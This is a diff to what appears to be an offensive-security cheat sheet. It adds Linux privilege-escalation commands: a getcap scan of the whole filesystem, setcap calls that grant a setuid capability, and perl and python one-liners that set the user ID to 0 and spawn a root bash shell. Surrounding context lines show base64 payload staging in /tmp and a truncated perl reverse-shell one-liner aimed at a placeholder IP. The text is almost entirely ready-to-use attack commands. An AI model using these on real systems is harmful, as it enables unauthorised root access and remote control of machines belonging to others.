@@ -514,6 +514,15 @@ echo 'command && -stuff here' | base64
 echo 'base64_here' > /tmp/my_script.sh
 echo '2nd_base64_here' >> /tmp/my_script.sh
 
+# find all files with capabilities
+getcap -r / 2>/dev/null
+
+# set setuid capability
+setcap cap_setuid+ep /path/to/file
+
+# remove all capabilities from file
+setcap -r /path/to/file
+
 # read all files in . + grep for search_term
 cat *|grep search_term
 
@@ -2914,6 +2923,9 @@ perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr, "IP_here:por
 
 # upgrade shell
 perl -e 'exec "/bin/bash"'
+
+# perl with setuid capability? --> spawn root shell
+perl -e 'use POSIX (setuid); POSIX::setuid(0); exec "/bin/bash";'
 ```
 
 
@@ -3430,6 +3442,10 @@ try:
 
 except: 
     print "Connection failed!"
+
+# python with setuid capability? --> spawn root shell
+python -c 'import pty,os;os.setuid(0);pty.spawn("/bin/bash")'
+python3 -c 'import pty,os;os.setuid(0);pty.spawn("/bin/bash")'
 ```
 
 
